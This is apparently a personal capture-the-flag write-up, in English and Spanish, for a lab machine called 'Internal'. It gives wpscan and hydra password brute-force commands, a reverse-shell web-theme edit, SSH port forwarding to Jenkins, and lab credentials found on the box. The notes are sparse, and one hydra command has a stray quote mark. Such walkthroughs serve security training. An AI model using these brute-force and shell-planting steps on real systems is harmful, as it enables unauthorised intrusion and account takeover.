---
title: "internal Write-up    "
description: "Write-up internal , HARD MACHINE "
pubDate: "Jul 08 2022"
heroImage: "/image.jpg"
---
10.10.137.140

phpmyadmin: admin'@'localhost

wpscan --url http://10.10.137.140//internal.thm/blog -U admin --passwords rockyou.txt

admin/my2boys

aparence > theme settings y se pone php reverse shell pentest monkey 


_blog/wp-content/themes/twentyseventeen/404.php_


www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

aubreanna@internal:/$ netstat -tan | grep 8080
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
aubreanna@internal:/$ 


ssh -L  9999:127.0.0.1:8080 aubreanna@internal.thm

-L para puerto local y : para el renvio de puerto 8080 al 9999


hydra 127.0.0.1 -s 9999 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /rockyou.txt" 

-f es la forma 
"/j_acegi_security_check:j_username : cabecera

groovy reverse shell

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

como estaba contectado por ssh , su root y la paswwd.tt
